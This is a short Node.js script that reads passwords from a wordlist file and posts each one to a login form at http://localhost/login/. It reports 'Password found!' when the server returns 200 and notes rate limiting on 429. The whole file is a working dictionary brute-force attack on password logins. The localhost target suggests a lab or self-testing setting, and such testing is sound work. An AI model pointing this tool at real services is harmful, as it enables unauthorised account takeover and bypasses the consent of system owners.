const request = require('request');
const fs  = require("fs");


fs.readFile('./wordgenerator/wordlist.txt', function(err, f){
    if(err) return console.log(err);
    var array = f.toString().split('\n');
    for(let i = 0; i < array.length; i++){
        makeRequest(array[i]);
    }
});


function makeRequest(password){
    request.post({url: 'http://localhost/login/', form: {pw: password}}, function (error, response, body) {
        if(error) return console.log("Request error: " + error);
        switch (response.statusCode){
            case 302:
                console.log("Incorrect password: " + password);
                break;
            case 429:
                console.log("too many requests");
                break;
            case 200:
                console.log("Password found!: " + password);
                break;
            default:
                console.log('statusCode:', response.statusCode);
                console.log('body:', body);
                break;
        }
    });
}